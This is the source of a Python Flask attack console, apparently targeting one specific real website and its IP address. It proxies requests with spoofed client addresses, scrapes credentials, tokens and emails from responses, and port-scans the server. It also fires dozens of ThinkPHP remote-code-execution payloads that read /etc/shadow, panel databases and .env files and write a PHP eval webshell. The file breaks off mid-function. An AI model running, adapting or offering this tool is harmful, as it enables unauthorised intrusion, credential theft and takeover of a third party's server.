from flask import Flask, request, jsonify, send_from_directory, Response
from flask_cors import CORS
import requests
import base64
import os
import socket
import re
import json
import time
import threading
import hashlib
import subprocess
import zipfile
import io
import random
import string
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
from bs4 import BeautifulSoup
from collections import defaultdict

# Optional imports with fallbacks
try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

try:
    import pymysql
    PYMYSQL_AVAILABLE = True
except ImportError:
    PYMYSQL_AVAILABLE = False

try:
    import redis
    REDIS_AVAILABLE = True
except ImportError:
    REDIS_AVAILABLE = False

try:
    import ftplib
    FTP_AVAILABLE = True
except ImportError:
    FTP_AVAILABLE = False

try:
    import pymongo
    PYMONGO_AVAILABLE = True
except ImportError:
    PYMONGO_AVAILABLE = False

try:
    import psycopg2
    PSYCOPG2_AVAILABLE = True
except ImportError:
    PSYCOPG2_AVAILABLE = False

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__, static_folder='.')
CORS(app, resources={r"/*": {"origins": "*"}})

TARGET = "https://goldmedal.cc"
TARGET_IP = "31.59.114.216"

# ============================================================
# GLOBAL ATTACK STATE - Stores all discovered data
# ============================================================
attack_state = {
    'open_ports': [],
    'open_ports_detailed': [],
    'discovered_credentials': [],
    'discovered_endpoints': [],
    'discovered_files': [],
    'vulnerable_params': [],
    'rce_verified': False,
    'rce_payloads_working': [],
    'current_shell': None,
    'extracted_configs': {},
    'bt_panel_url': None,
    'bt_panel_credentials': None,
    'git_files': [],
    'backup_files': [],
    'database_info': {},
    'attack_history': [],
    'session_cookies': {},
    'csrf_tokens': [],
    'api_keys': [],
    'admin_urls': [],
    'upload_endpoints': [],
    'webshell_locations': [],
    'lfi_vulnerabilities': [],
    'sqli_vulnerabilities': [],
    'ssrf_endpoints': [],
    'xss_vulnerabilities': [],
    'idor_vulnerabilities': [],
    'ssti_vulnerabilities': [],
    'command_injection': [],
    'file_inclusion': [],
    'xxe_vulnerabilities': [],
    'cors_misconfig': [],
    'jwt_tokens': [],
    'subdomains': [],
    'virtual_hosts': [],
    'tech_stack': {},
    'waf_detected': False,
    'cloudflare_detected': False,
    'rate_limiting_detected': False,
    'session_tokens': [],
    'oauth_endpoints': [],
    'graphql_endpoints': [],
    'swagger_docs': [],
    'robots_txt': [],
    'sitemap_xml': [],
    'dns_records': {},
    'ssl_info': {},
    'whois_info': {},
    'email_addresses': [],
    'phone_numbers': [],
    'social_links': [],
    'cms_detected': None,
    'server_type': None,
    'programming_languages': [],
    'frameworks': [],
    'libraries': [],
    'total_requests_sent': 0,
    'successful_exploits': 0,
    'scan_start_time': None,
    'scan_end_time': None,
}

# Thread pool for concurrent attacks
executor = ThreadPoolExecutor(max_workers=50)
session_pool = {}
cache = {}
CACHE_DURATION = 30
request_lock = threading.Lock()

def get_session():
    """Get or create a session for connection reuse"""
    thread_id = threading.get_ident()
    if thread_id not in session_pool:
        session = requests.Session()
        session.verify = False
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        session_pool[thread_id] = session
    return session_pool[thread_id]

def add_to_attack_state(category, data):
    """Add discovered data to attack state for chained attacks"""
    if category not in attack_state:
        attack_state[category] = []
    if isinstance(data, list):
        for item in data:
            if item not in attack_state[category]:
                attack_state[category].append(item)
    else:
        if data not in attack_state[category]:
            attack_state[category].append(data)
    
    attack_state['attack_history'].append({
        'timestamp': datetime.now().isoformat(),
        'category': category,
        'data': str(data)[:500]
    })
    
    # Keep history manageable
    if len(attack_state['attack_history']) > 1000:
        attack_state['attack_history'] = attack_state['attack_history'][-500:]

def increment_request_count():
    """Thread-safe request counter"""
    with request_lock:
        attack_state['total_requests_sent'] += 1

# ============================================================
# SERVE HTML & STATIC FILES
# ============================================================
@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/<path:filename>')
def serve_static(filename):
    if os.path.exists(filename):
        return send_from_directory('.', filename)
    return jsonify({'error': 'File not found'}), 404

# ============================================================
# ATTACK STATE MANAGEMENT
# ============================================================
@app.route('/attack-state')
def get_attack_state():
    """Get comprehensive attack state"""
    return jsonify({
        'attack_state': {
            'recon': {
                'open_ports': attack_state['open_ports'],
                'open_ports_detailed': attack_state['open_ports_detailed'][:50],
                'subdomains': attack_state['subdomains'],
                'dns_records': attack_state['dns_records'],
                'ssl_info': attack_state['ssl_info'],
                'tech_stack': attack_state['tech_stack'],
                'waf_detected': attack_state['waf_detected'],
                'cloudflare_detected': attack_state['cloudflare_detected'],
                'cms_detected': attack_state['cms_detected'],
                'server_type': attack_state['server_type'],
            },
            'vulnerabilities': {
                'rce_verified': attack_state['rce_verified'],
                'rce_payloads': attack_state['rce_payloads_working'],
                'lfi_count': len(attack_state['lfi_vulnerabilities']),
                'sqli_count': len(attack_state['sqli_vulnerabilities']),
                'xss_count': len(attack_state['xss_vulnerabilities']),
                'idor_count': len(attack_state['idor_vulnerabilities']),
                'ssti_count': len(attack_state['ssti_vulnerabilities']),
                'command_injection': len(attack_state['command_injection']),
                'ssrf_count': len(attack_state['ssrf_endpoints']),
                'xxe_count': len(attack_state['xxe_vulnerabilities']),
            },
            'discoveries': {
                'credentials': len(attack_state['discovered_credentials']),
                'credentials_list': attack_state['discovered_credentials'][:20],
                'endpoints': len(attack_state['discovered_endpoints']),
                'endpoints_list': attack_state['discovered_endpoints'][:50],
                'files': len(attack_state['discovered_files']),
                'api_keys': len(attack_state['api_keys']),
                'jwt_tokens': len(attack_state['jwt_tokens']),
                'admin_urls': attack_state['admin_urls'][:20],
                'upload_endpoints': attack_state['upload_endpoints'][:20],
                'webshell_locations': attack_state['webshell_locations'],
                'backup_files': len(attack_state['backup_files']),
                'git_leaked': len(attack_state['git_files']) > 0,
                'database_compromised': len(attack_state['database_info']) > 0,
            },
            'exploitation': {
                'successful_exploits': attack_state['successful_exploits'],
                'bt_panel_compromised': attack_state['bt_panel_credentials'] is not None,
                'current_shell': attack_state['current_shell'] is not None,
                'webshells_deployed': len(attack_state['webshell_locations']),
            },
            'stats': {
                'total_requests': attack_state['total_requests_sent'],
                'attack_history_count': len(attack_state['attack_history']),
                'scan_start_time': attack_state['scan_start_time'],
                'scan_end_time': attack_state['scan_end_time'],
            },
            'recent_attacks': attack_state['attack_history'][-20:],
            'email_addresses': attack_state['email_addresses'][:20],
            'social_links': attack_state['social_links'][:20],
        }
    })

@app.route('/reset-state')
def reset_attack_state():
    """Reset attack state"""
    global attack_state
    attack_state = {
        'open_ports': [],
        'open_ports_detailed': [],
        'discovered_credentials': [],
        'discovered_endpoints': [],
        'discovered_files': [],
        'vulnerable_params': [],
        'rce_verified': False,
        'rce_payloads_working': [],
        'current_shell': None,
        'extracted_configs': {},
        'bt_panel_url': None,
        'bt_panel_credentials': None,
        'git_files': [],
        'backup_files': [],
        'database_info': {},
        'attack_history': [],
        'session_cookies': {},
        'csrf_tokens': [],
        'api_keys': [],
        'admin_urls': [],
        'upload_endpoints': [],
        'webshell_locations': [],
        'lfi_vulnerabilities': [],
        'sqli_vulnerabilities': [],
        'ssrf_endpoints': [],
        'xss_vulnerabilities': [],
        'idor_vulnerabilities': [],
        'ssti_vulnerabilities': [],
        'command_injection': [],
        'file_inclusion': [],
        'xxe_vulnerabilities': [],
        'cors_misconfig': [],
        'jwt_tokens': [],
        'subdomains': [],
        'virtual_hosts': [],
        'tech_stack': {},
        'waf_detected': False,
        'cloudflare_detected': False,
        'rate_limiting_detected': False,
        'session_tokens': [],
        'oauth_endpoints': [],
        'graphql_endpoints': [],
        'swagger_docs': [],
        'robots_txt': [],
        'sitemap_xml': [],
        'dns_records': {},
        'ssl_info': {},
        'whois_info': {},
        'email_addresses': [],
        'phone_numbers': [],
        'social_links': [],
        'cms_detected': None,
        'server_type': None,
        'programming_languages': [],
        'frameworks': [],
        'libraries': [],
        'total_requests_sent': 0,
        'successful_exploits': 0,
        'scan_start_time': None,
        'scan_end_time': None,
    }
    return jsonify({'message': 'Attack state reset successfully', 'timestamp': datetime.now().isoformat()})

# ============================================================
# PROXY - Enhanced with Full Auto-Discovery
# ============================================================
@app.route('/proxy', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD'])
def proxy():
    path = request.args.get('path', '/')
    custom_headers = request.args.get('headers', '{}')
    follow_redirects = request.args.get('follow', 'false').lower() == 'true'
    
    # Parse custom headers
    try:
        extra_headers = json.loads(custom_headers)
    except:
        extra_headers = {}
    
    url = f"{TARGET}/{path.lstrip('/')}"
    
    cache_key = f"proxy:{request.method}:{url}:{str(extra_headers)}"
    if request.method == 'GET' and cache_key in cache:
        cached_time, cached_data = cache[cache_key]
        if time.time() - cached_time < CACHE_DURATION:
            return jsonify(cached_data)
    
    headers = {
        'User-Agent': request.headers.get('User-Agent', extra_headers.get('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')),
        'Accept': extra_headers.get('Accept', '*/*'),
        'Accept-Language': extra_headers.get('Accept-Language', 'en-US,en;q=0.5'),
        'X-Forwarded-For': extra_headers.get('X-Forwarded-For', f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"),
    }
    
    # Merge extra headers
    headers.update(extra_headers)
    
    cookies = {}
    if 'custom_cookie' in request.args:
        encoded = base64.b64encode(request.args['custom_cookie'].encode()).decode()
        cookies['username'] = encoded
    
    try:
        session = get_session()
        increment_request_count()
        
        if request.method == 'GET':
            resp = session.get(url, headers=headers, cookies=cookies, 
                             allow_redirects=follow_redirects, timeout=30)
        elif request.method == 'POST':
            resp = session.post(url, headers=headers, cookies=cookies,
                              data=request.get_data(), allow_redirects=follow_redirects, timeout=30)
        elif request.method == 'PUT':
            resp = session.put(url, headers=headers, cookies=cookies,
                             data=request.get_data(), allow_redirects=follow_redirects, timeout=30)
        elif request.method == 'DELETE':
            resp = session.delete(url, headers=headers, cookies=cookies,
                                allow_redirects=follow_redirects, timeout=30)
        elif request.method == 'PATCH':
            resp = session.patch(url, headers=headers, cookies=cookies,
                               data=request.get_data(), allow_redirects=follow_redirects, timeout=30)
        elif request.method == 'HEAD':
            resp = session.head(url, headers=headers, cookies=cookies,
                              allow_redirects=follow_redirects, timeout=30)
        else:
            resp = session.request(request.method, url, headers=headers,
                                 cookies=cookies, data=request.get_data(),
                                 allow_redirects=follow_redirects, timeout=30)
        
        body = resp.text[:50000]  # Increased limit
        
        # ===== AUTO-DISCOVERY ENGINE =====
        discoveries = {
            'new_endpoints': [],
            'credentials_found': [],
            'csrf_tokens': [],
            'api_keys': [],
            'jwt_tokens': [],
            'email_addresses': [],
            'admin_urls': [],
            'upload_forms': [],
            'hidden_inputs': [],
            'comments': [],
            'javascript_files': [],
            'technology_indicators': [],
        }
        
        # Extract all href/src/action URLs
        all_urls = re.findall(r'(?:href|src|action|url|content)\s*=\s*["\']([^"\']+)["\']', body, re.IGNORECASE)
        discoveries['new_endpoints'] = [u for u in all_urls if u.startswith('/') or TARGET.replace('https://', '') in u][:30]
        
        # Extract API endpoints
        api_patterns = re.findall(r'["\'](\/[a-zA-Z0-9/_-]*(?:api|v\d|graphql|rest|soap|oauth|login|register|admin|dashboard|upload|download|config|setting|user|account|profile|password|token|auth|session)[a-zA-Z0-9/_.-]*)["\']', body, re.IGNORECASE)
        discoveries['new_endpoints'].extend(api_patterns[:30])
        
        # Extract credentials
        cred_patterns = [
            r'(?:password|passwd|pwd|pass)\s*[:=]\s*["\']([^"\']{3,50})["\']',
            r'(?:secret|api_key|apikey|token|auth_token|access_token|bearer)\s*[:=]\s*["\']([^"\']{8,})["\']',
            r'(?:username|user|email|login)\s*[:=]\s*["\']([^"\']{3,50})["\']',
            r'(?:database|db_name|db_host|db_user|db_pass)\s*[:=]\s*["\']([^"\']{3,50})["\']',
            r'(?:ftp|ssh|mysql|redis|mongodb)\s*[:=]\s*["\']([^"\']{3,50})["\']',
        ]
        for pattern in cred_patterns:
            matches = re.findall(pattern, body, re.IGNORECASE)
            discoveries['credentials_found'].extend(matches)
        
        # Extract CSRF tokens
        csrf_patterns = [
            r'(?:csrf|_token|authenticity_token|nonce|xsrf).*?value\s*=\s*["\']([^"\']+)["\']',
            r'<meta\s+name\s*=\s*["\']csrf[^"\']*["\']\s+content\s*=\s*["\']([^"\']+)["\']',
        ]
        for pattern in csrf_patterns:
            matches = re.findall(pattern, body, re.IGNORECASE)
            discoveries['csrf_tokens'].extend(matches)
        
        # Extract JWT tokens
        jwt_pattern = r'(?:Bearer\s+)?(eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,})'
        discoveries['jwt_tokens'] = re.findall(jwt_pattern, body)
        
        # Extract email addresses
        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        discoveries['email_addresses'] = list(set(re.findall(email_pattern, body)))[:20]
        
        # Extract admin URLs
        admin_patterns = re.findall(r'["\'](\/(?:admin|administrator|wp-admin|dashboard|panel|manage|control|backend|cms)[a-zA-Z0-9/_-]*)["\']', body, re.IGNORECASE)
        discoveries['admin_urls'] = admin_patterns[:20]
        
        # Extract upload forms
        if 'enctype="multipart/form-data"' in body or 'type="file"' in body:
            discoveries['upload_forms'].append(url)
        
        # Extract hidden inputs
        hidden_inputs = re.findall(r'<input[^>]+type\s*=\s*["\']hidden["\'][^>]+name\s*=\s*["\']([^"\']+)["\']', body, re.IGNORECASE)
        discoveries['hidden_inputs'] = hidden_inputs[:20]
        
        # Extract HTML comments
        comments = re.findall(r'<!--(.*?)-->', body, re.DOTALL)
        discoveries['comments'] = [c.strip()[:200] for c in comments if len(c.strip()) > 5][:20]
        
        # Extract JavaScript files
        js_files = re.findall(r'<script[^>]+src\s*=\s*["\']([^"\']+\.js[^"\']*)["\']', body, re.IGNORECASE)
        discoveries['javascript_files'] = js_files[:20]
        
        # Detect technology stack
        tech_indicators = {
            'ThinkPHP': 'thinkphp' in body.lower() or 'think\\' in body,
            'Laravel': 'laravel' in body.lower() or 'laravel_session' in str(resp.cookies),
            'WordPress': 'wp-content' in body.lower() or 'wordpress' in body.lower(),
            'Joomla': 'joomla' in body.lower(),
            'Drupal': 'drupal' in body.lower(),
            'Vue.js': 'vue' in body.lower() or 'v-bind' in body or 'v-model' in body,
            'React': 'react' in body.lower() or '__REACT' in body,
            'Angular': 'ng-' in body or 'angular' in body.lower(),
            'jQuery': 'jquery' in body.lower(),
            'Bootstrap': 'bootstrap' in body.lower(),
            'Nginx': resp.headers.get('Server', '').lower().startswith('nginx'),
            'Apache': 'apache' in resp.headers.get('Server', '').lower(),
            'PHP': 'php' in resp.headers.get('X-Powered-By', '').lower() or '.php' in url,
            'MySQL': 'mysql' in body.lower(),
            'Cloudflare': 'cf-ray' in resp.headers or 'cloudflare' in resp.headers.get('Server', '').lower(),
        }
        for tech, detected in tech_indicators.items():
            if detected:
                discoveries['technology_indicators'].append(tech)
        
        # ===== STORE DISCOVERIES =====
        if discoveries['new_endpoints']:
            add_to_attack_state('discovered_endpoints', discoveries['new_endpoints'])
        if discoveries['credentials_found']:
            add_to_attack_state('discovered_credentials', discoveries['credentials_found'])
        if discoveries['csrf_tokens']:
            add_to_attack_state('csrf_tokens', discoveries['csrf_tokens'])
        if discoveries['jwt_tokens']:
            add_to_attack_state('jwt_tokens', discoveries['jwt_tokens'])
        if discoveries['email_addresses']:
            add_to_attack_state('email_addresses', discoveries['email_addresses'])
        if discoveries['admin_urls']:
            add_to_attack_state('admin_urls', discoveries['admin_urls'])
        if discoveries['upload_forms']:
            add_to_attack_state('upload_endpoints', discoveries['upload_forms'])
        if discoveries['technology_indicators']:
            add_to_attack_state('tech_stack', discoveries['technology_indicators'])
        if discoveries['javascript_files']:
            add_to_attack_state('discovered_files', discoveries['javascript_files'])
        
        # Detect WAF/Cloudflare
        if 'cf-ray' in resp.headers or 'cloudflare' in resp.headers.get('Server', '').lower():
            attack_state['cloudflare_detected'] = True
        if resp.status_code == 403 or resp.status_code == 406:
            attack_state['waf_detected'] = True
        
        # Detect server type
        server_header = resp.headers.get('Server', '')
        if server_header:
            attack_state['server_type'] = server_header
        
        result = {
            'url': url,
            'status_code': resp.status_code,
            'headers': dict(resp.headers),
            'cookies': dict(resp.cookies),
            'body': body,
            'length': len(resp.text),
            'timestamp': datetime.now().isoformat(),
            'auto_discoveries': {k: v[:10] if isinstance(v, list) else v for k, v in discoveries.items()},
            'discovery_summary': {
                'endpoints_found': len(discoveries['new_endpoints']),
                'credentials_found': len(discoveries['credentials_found']),
                'tokens_found': len(discoveries['csrf_tokens']),
                'jwts_found': len(discoveries['jwt_tokens']),
                'emails_found': len(discoveries['email_addresses']),
                'admin_urls_found': len(discoveries['admin_urls']),
                'technologies': discoveries['technology_indicators'],
            }
        }
        
        if request.method == 'GET':
            cache[cache_key] = (time.time(), result)
        
        return jsonify(result)
    except requests.exceptions.Timeout:
        return jsonify({'error': 'Request timed out', 'url': url}), 504
    except requests.exceptions.ConnectionError:
        return jsonify({'error': 'Connection failed', 'url': url}), 502
    except Exception as e:
        return jsonify({'error': str(e), 'url': url}), 500

# ============================================================
# COMPREHENSIVE PORT SCANNING
# ============================================================
@app.route('/hunt/scan-common-ports')
def scan_common_ports():
    """Enhanced comprehensive port scanning with service detection"""
    ports_to_scan = [
        (21, 'FTP'), (22, 'SSH'), (23, 'Telnet'), (25, 'SMTP'),
        (53, 'DNS'), (80, 'HTTP'), (81, 'HTTP-Alt'),
        (110, 'POP3'), (111, 'RPC'), (135, 'MSRPC'),
        (139, 'NetBIOS'), (143, 'IMAP'), (443, 'HTTPS'),
        (445, 'SMB'), (465, 'SMTPS'), (514, 'Syslog'),
        (587, 'SMTP-Submission'), (993, 'IMAPS'), (995, 'POP3S'),
        (1080, 'SOCKS'), (1433, 'MSSQL'), (1521, 'Oracle'),
        (1723, 'PPTP'), (2049, 'NFS'), (2082, 'cPanel'),
        (2083, 'cPanel-SSL'), (2086, 'WHM'), (2087, 'WHM-SSL'),
        (2095, 'Webmail'), (2096, 'Webmail-SSL'),
        (2222, 'DirectAdmin'), (2483, 'Oracle-SSL'),
        (3128, 'Squid'), (3306, 'MySQL'), (3389, 'RDP'),
        (4444, 'Metasploit'), (4848, 'GlassFish'),
        (5432, 'PostgreSQL'), (5555, 'Android-Debug'),
        (5900, 'VNC'), (5984, 'CouchDB'), (6379, 'Redis'),
        (7001, 'WebLogic'), (7002, 'WebLogic-SSL'),
        (8000, 'HTTP-Alt'), (8009, 'AJP'),
        (8080, 'HTTP-Proxy'), (8089, 'Splunk'),
        (8181, 'HTTP-Alt'), (8443, 'HTTPS-Alt'),
        (8888, 'BT-Panel'), (888, 'BT-Panel-Old'),
        (9000, 'PHP-FPM'), (9001, 'Supervisor'),
        (9043, 'WebSphere'), (9090, 'Cockpit'),
        (9200, 'Elasticsearch'), (9300, 'Elasticsearch-Node'),
        (9999, 'HTTP-Alt'), (10000, 'Webmin'),
        (11211, 'Memcached'), (15672, 'RabbitMQ'),
        (27017, 'MongoDB'), (27018, 'MongoDB-Shard'),
        (28017, 'MongoDB-Web'), (50000, 'SAP'),
        (50030, 'Hadoop'), (50070, 'Hadoop-Web'),
        (61616, 'ActiveMQ'),
    ]
    
    results = []
    
    def scan_port(port, service):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((TARGET_IP, port))
            
            if result == 0:
                # Port is open - try to grab banner
                banner = None
                http_info = None
                
                # Try HTTP request
                try:
                    http_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    http_sock.settimeout(3)
                    http_sock.connect((TARGET_IP, port))
                    http_sock.send(f'GET / HTTP/1.0\r\nHost: {TARGET_IP}\r\n\r\n'.encode())
                    banner_data = http_sock.recv(4096).decode('utf-8', errors='ignore')
                    http_sock.close()
                    
                    # Parse HTTP response
                    status_match = re.search(r'HTTP/\d\.\d\s+(\d+)', banner_data)
                    server_match = re.search(r'Server:\s*(.+)', banner_data, re.IGNORECASE)
                    title_match = re.search(r'<title>(.*?)</title>', banner_data, re.IGNORECASE)
                    
                    http_info = {
                        'status': int(status_match.group(1)) if status_match else None,
                        'server': server_match.group(1).strip() if server_match else None,
                        'title': title_match.group(1) if title_match else None,
                    }
                    banner = banner_data[:500]
                except:
                    # Try simple banner grab
                    try:
                        banner_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        banner_sock.settimeout(3)
                        banner_sock.connect((TARGET_IP, port))
                        banner_sock.settimeout(2)
                        banner = banner_sock.recv(1024).decode('utf-8', errors='ignore')[:500]
                        banner_sock.close()
                    except:
                        pass
                
                sock.close()
                
                port_info = {
                    'port': port,
                    'service': service,
                    'open': True,
                    'banner': banner,
                    'http_info': http_info,
                    'ip': TARGET_IP,
                }
                
                add_to_attack_state('open_ports', [f"{port}/{service}"])
                add_to_attack_state('open_ports_detailed', [port_info])
                
                return port_info
            else:
                sock.close()
                return {'port': port, 'service': service, 'open': False}
        except Exception as e:
            return {'port': port, 'service': service, 'open': False, 'error': str(e)}
    
    # Concurrent port scanning
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(scan_port, port, service) for port, service in ports_to_scan]
        for future in as_completed(futures):
            result = future.result()
            if result['open']:
                results.append(result)
    
    results.sort(key=lambda x: x['port'])
    return jsonify(results)

# ============================================================
# ENHANCED RCE PAYLOADS
# ============================================================
@app.route('/hunt/rce-payloads')
def rce_payloads():
    """Comprehensive RCE payload testing with auto-exploitation"""
    payloads = [
        # PHP Info & System
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=uname -a',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=pwd',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=hostname',
        
        # File System
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls -la /',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls -la /www/wwwroot/',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls -la /tmp/',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=find /www/wwwroot -name "*.php" 2>/dev/null | head -30',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=find / -name "*.conf" -o -name "*.ini" -o -name "*.env" 2>/dev/null | head -20',
        
        # Sensitive Files
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /etc/passwd',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /etc/shadow 2>/dev/null',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /etc/hosts',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /www/server/panel/data/default.db 2>/dev/null | strings | head -50',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /www/server/panel/data/admin_path.pl 2>/dev/null',
        
        # Network
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=netstat -tlnp',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ss -tlnp',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ifconfig',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ip addr',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=arp -a',
        
        # Process Info
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ps aux',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ps aux | grep -E "mysql|redis|nginx|apache|php|python|java|node"',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=top -b -n1 | head -20',
        
        # Environment
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=env',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=printenv',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /proc/1/environ 2>/dev/null | tr "\\0" "\\n"',
        
        # Database & Config
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=find /www -name "database.php" -exec cat {} \\; 2>/dev/null | head -50',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=find /www -name ".env" -exec cat {} \\; 2>/dev/null | head -50',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=mysql -e "SHOW DATABASES;" 2>/dev/null',
        
        # PHP Functions
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_get_contents&vars[1][]=/etc/passwd',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_get_contents&vars[1][]=/www/wwwroot/invest307.fa/.env',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_get_contents&vars[1][]=/www/wwwroot/invest307.fa/config/database.php',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=scandir&vars[1][]=/www/wwwroot/',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=scandir&vars[1][]=/',
        
        # Alternative Payloads
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=eval&vars[1][]=phpinfo();',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=exec&vars[1][]=whoami',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=whoami',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=passthru&vars[1][]=whoami',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=proc_open&vars[1][]=whoami',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=popen&vars[1][]=whoami',
        
        # Template Injection
        '/index.php?s=index/think\\view\\driver\\Php/display&content=<?php phpinfo();?>',
        '/index.php?s=index/think\\template\\driver\\file/write&cacheFile=shell.php&content=<?php @eval($_POST["cmd"]);?>',
    ]
    
    results = []
    
    def test_payload(payload):
        try:
            r = requests.get(f"{TARGET}{payload}", timeout=20, verify=False,
                           headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
            increment_request_count()
            
            # Enhanced RCE detection
            is_rce = False
            indicators = []
            
            if r.status_code == 200 and len(r.text) > 20:
                body_lower = r.text.lower()
                
                # Command output indicators
                if 'uid=' in r.text and 'gid=' in r.text:
                    indicators.append('Unix ID output')
                    is_rce = True
                if 'root:' in r.text and ('/bin/bash' in r.text or '/bin/sh' in r.text):
                    indicators.append('Passwd file')
                    is_rce = True
                if 'php version' in body_lower or 'phpinfo' in body_lower:
                    indicators.append('PHP Info')
                    is_rce = True
                if 'total' in body_lower and ('drwx' in r.text or '-rw' in r.text):
                    indicators.append('Directory listing')
                    is_rce = True
                if 'tcp' in body_lower and 'listen' in body_lower:
                    indicators.append('Netstat output')
                    is_rce = True
                if 'pid' in body_lower and 'user' in body_lower:
                    indicators.append('Process list')
                    is_rce = True
                if 'server' in r.headers.get('Server', '') and 'php' in r.headers.get('X-Powered-By', ''):
                    if len(r.text) > 100:
                        indicators.append('Server info')
                        is_rce = True
                
                # Check for sensitive data in output
                if 'password' in body_lower or 'passwd' in body_lower:
                    creds = re.findall(r'(?:password|passwd|pwd)\s*[=:]\s*["\']?([^"\'&\s]{3,})', r.text, re.IGNORECASE)
                    if creds:
                        add_to_attack_state('discovered_credentials', creds)
                
                if 'DB_' in r.text or 'DATABASE_' in r.text:
                    db_creds = re.findall(r'(?:DB_\w+|DATABASE_\w+)\s*=\s*["\']?([^"\'&\s]{3,})', r.text)
                    if db_creds:
                        add_to_attack_state('database_info', {'config_values': db_creds})
            
            if is_rce:
                attack_state['rce_verified'] = True
                attack_state['rce_payloads_working'].append(payload)
                attack_state['successful_exploits'] += 1
                add_to_attack_state('vulnerable_params', [payload])
            
            return {
                'payload': payload,
                'status': r.status_code,
                'length': len(r.text),
                'rce_verified': is_rce,
                'indicators': indicators,
                'snippet': r.text[:2000]
            }
        except Exception as e:
            return {'payload': payload, 'error': str(e)}
    
    # Concurrent testing
